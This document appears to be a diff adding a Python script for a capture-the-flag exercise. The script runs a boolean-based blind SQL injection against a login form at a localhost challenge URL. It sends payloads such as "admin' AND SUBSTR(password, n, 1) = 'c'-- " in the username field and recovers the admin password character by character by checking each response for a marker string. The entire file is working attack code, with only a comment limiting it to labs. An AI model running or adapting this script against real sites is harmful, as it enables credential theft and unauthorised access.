@@ -1,0 +1,67 @@
+import time
+import string
+import requests
+
+# --- CONFIG ---
+url = "http://challenge.localhost:80"   # target (CTF/lab only)
+marker = "Hello"                         # text that indicates a successful guess
+max_length = 64                          # safety cap to avoid infinite loops
+delay = 0.08                             # polite delay between requests (seconds)
+timeout = 5                              # request timeout (seconds)
+retries = 3                              # retry on transient network errors
+
+# Printable ASCII (space .. ~). Skip newline/carriage-return characters.
+searchspace = ''.join(chr(i) for i in range(32, 127) if chr(i) not in ("\n", "\r"))
+
+session = requests.Session()
+session.headers.update({"User-Agent": "ctf-sqli-script/1.0"})
+
+solution = ""
+
+while True:
+    if len(solution) >= max_length:
+        print(f"[!] Reached max_length ({max_length}). Stopping. Current: {solution!r}")
+        break
+
+    found_char = False
+
+    for c in searchspace:
+        # If the charset includes single-quote, it will be used as-is. If that breaks your payload,
+        # consider removing "'" from searchspace and instead try hex/char() techniques for advanced labs.
+        payload = f"admin' AND SUBSTR(password, {len(solution) + 1}, 1) = '{c}'-- "
+
+        data = {"username": payload, "password": "irrelevant"}
+
+        last_exc = None
+        for attempt in range(retries):
+            try:
+                resp = session.post(url, data=data, timeout=timeout)
+                break
+            except requests.RequestException as e:
+                last_exc = e
+                time.sleep(0.5)  # backoff between attempts
+        else:
+            print(f"[!] Request failed after {retries} attempts for char {c!r}: {last_exc}")
+            time.sleep(delay)
+            continue
+
+        # Common checks: marker in body OR HTTP status indicates something interesting.
+        if marker in resp.text:
+            solution += c
+            print(f"[+] Found so far: {solution!r}")
+            found_char = True
+            break
+
+        # Example of different server behaviour: some labs return 200/403/500 in different cases.
+        # Here we specifically check for 403 as a possible "not allowed" and continue searching other chars.
+        if resp.status_code == 403:
+            # optionally log
+            continue
+
+        # Politeness: tiny delay between tries
+        time.sleep(delay)
+
+    if not found_char:
+        # no character matched at this position -> assume password finished
+        print("[*] No matching character found for next position. Final password:", solution)
+        break
